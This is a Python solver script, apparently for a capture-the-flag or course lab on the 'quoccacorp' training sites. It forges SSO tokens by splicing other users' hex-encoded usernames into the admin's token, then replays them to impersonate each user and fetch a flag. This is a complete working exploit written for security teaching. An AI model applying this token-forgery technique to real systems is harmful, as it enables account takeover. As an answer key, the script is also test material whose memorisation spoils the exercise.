import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

BASE_URL = "https://easywiki.quoccacorp.com"
IDP_URL = "https://quoccaid.quoccacorp.com"
ADMIN = "admin"

class Solver:
    def __init__(self):
        self.session = get_session()

    def get_usernames(self) -> list[str]:
        response = self.session.get(f"{IDP_URL}/users")
        soup = BeautifulSoup(response.text, "html.parser")
        return [user.text for user in soup.find_all("td")]

    def get_padding(self, length):
        return "2b" * length

    def main(self):
        response = self.session.get(BASE_URL)

        soup = BeautifulSoup(response.text, "html.parser")
        form_element = soup.find("form")
        idp_login_url = form_element.get("action")
        redirect_app_value = form_element.find("input", {"name": "app"}).get("value")

        response = self.session.post(idp_login_url,
                                     params={"app": redirect_app_value},
                                     data={"user": ADMIN, "password": ADMIN},
                                     allow_redirects=False)

        redirect_url = response.headers.get("Location")
        sso_callback_url = redirect_url.split("token=")[0]
        easywiki_admin_token = redirect_url.split("token=")[1]

        ADMIN_USERNAME_AND_PADDING_HEX = "61646d696e2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b"
        token_start = easywiki_admin_token.split(ADMIN_USERNAME_AND_PADDING_HEX)[0]
        token_end = easywiki_admin_token.split(ADMIN_USERNAME_AND_PADDING_HEX)[1]

        for username in self.get_usernames():
            max_username_len = len(ADMIN_USERNAME_AND_PADDING_HEX) // 2
            username_len = len(username)
            assert username_len <= max_username_len

            username_hex = username.encode().hex()
            new_token = token_start + username_hex + self.get_padding(max_username_len - username_len) + token_end

            response = self.session.get(sso_callback_url, params={"token": new_token})
            response = self.session.get(f"{BASE_URL}/The_Flag")
            find_flag(response.text)

if __name__ == "__main__":
    Solver().main()